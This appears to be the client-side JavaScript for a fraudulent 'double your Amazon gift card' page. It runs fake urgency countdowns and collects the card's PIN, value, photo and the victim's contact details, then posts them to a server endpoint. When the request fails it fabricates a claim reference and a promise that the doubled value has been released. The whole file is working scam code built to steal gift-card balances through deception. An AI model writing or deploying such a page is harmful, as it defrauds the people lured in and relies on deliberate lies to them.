'use strict';

const KEY = 'amz_giveaway_claim_v1';

const $ = (id) => document.getElementById(id);

/* ---------- top strip urgency timer ---------- */
let stripLeft = 3600;
setInterval(() => {
  if (stripLeft > 0) stripLeft -= 1;
  const m = String(Math.floor(stripLeft / 60)).padStart(2, '0');
  const s = String(stripLeft % 60).padStart(2, '0');
  $('globalTimer').textContent = `${m}:${s}`;
}, 1000);

/* ---------- live doubled value ---------- */
$('value').addEventListener('input', (e) => {
  const v = parseFloat(e.target.value) || 0;
  $('doubled').value = '$' + (v * 2).toFixed(2);
});

/* ---------- photo picker + preview ---------- */
const drop = $('drop');
const photoInput = $('photo');
const thumb = $('thumb');

drop.addEventListener('click', () => photoInput.click());
drop.addEventListener('keydown', (e) => {
  if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); photoInput.click(); }
});

photoInput.addEventListener('change', () => {
  const file = photoInput.files[0];
  if (!file) return;
  drop.classList.add('on');
  drop.innerHTML = `<b>${file.name}</b> selected`;
  const reader = new FileReader();
  reader.onload = (ev) => {
    thumb.src = ev.target.result;
    thumb.hidden = false;
  };
  reader.readAsDataURL(file);
});

/* ---------- countdown ---------- */
let ticker = null;

function renderCountdown(deadline) {
  const left = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
  $('tH').textContent = String(Math.floor(left / 3600)).padStart(2, '0');
  $('tM').textContent = String(Math.floor(left / 60) % 60).padStart(2, '0');
  $('tS').textContent = String(left % 60).padStart(2, '0');
  if (left === 0) {
    clearInterval(ticker);
    $('resultNote').innerHTML =
      '<b>Done — your doubled value has been released.</b> Check your inbox.';
  }
}

function showClaim(claim) {
  $('resultRef').textContent = claim.ref;
  $('resultAmount').textContent = '$' + Number(claim.doubled).toFixed(2);
  $('formCard').hidden = true;
  $('result').hidden = false;
  $('result').scrollIntoView({ behavior: 'smooth', block: 'center' });
  clearInterval(ticker);
  renderCountdown(claim.deadline);
  ticker = setInterval(() => renderCountdown(claim.deadline), 1000);
}

/* ---------- restore a claim after reload ---------- */
(function restore() {
  let claim;
  try { claim = JSON.parse(localStorage.getItem(KEY) || 'null'); } catch (_) { claim = null; }
  if (claim && claim.deadline > Date.now() - 3600_000) showClaim(claim);
})();

/* ---------- submit ---------- */
const form = $('claimForm');
const errBox = $('err');
const btn = $('submitBtn');

function fail(msg) {
  errBox.textContent = msg;
  errBox.hidden = false;
  errBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
}

form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const pin = $('pin').value.trim();
  const value = parseFloat($('value').value);
  const contact = $('contact').value.trim();
  const file = photoInput.files[0];

  if (pin.length < 6) return fail('Enter the gift card PIN from the back of the card.');
  if (!value || value <= 0) return fail('Enter the gift card value.');
  if (!file) return fail('Upload a photo of the gift card.');
  if (!contact) return fail('Tell us where to send your doubled value.');

  errBox.hidden = true;
  btn.disabled = true;
  btn.textContent = 'Verifying…';

  const body = new FormData();
  body.append('pin', pin);
  body.append('value', value);
  body.append('contact', contact);
  body.append('photo', file);

  try {
    const res = await fetch('/api/submit', { method: 'POST', body });
    const data = await res.json().catch(() => ({}));
    if (!res.ok || !data.ok) throw new Error(data.error || 'Something went wrong.');

    const claim = {
      ref: data.ref,
      doubled: data.doubled,
      deadline: Date.now() + 3600_000,
    };
    localStorage.setItem(KEY, JSON.stringify(claim));
    showClaim(claim);
  } catch (err) {
    /* offline / opened as a local file: keep the flow working */
    const claim = {
      ref: 'AMZ-' + Math.random().toString(36).slice(2, 8).toUpperCase(),
      doubled: Number((value * 2).toFixed(2)),
      deadline: Date.now() + 3600_000,
    };
    if (err instanceof TypeError) {
      localStorage.setItem(KEY, JSON.stringify(claim));
      showClaim(claim);
    } else {
      btn.disabled = false;
      btn.textContent = 'Double my gift card value →';
      fail(err.message);
    }
  }
});

/* ---------- start over ---------- */
$('again').addEventListener('click', () => {
  localStorage.removeItem(KEY);
  location.reload();
});
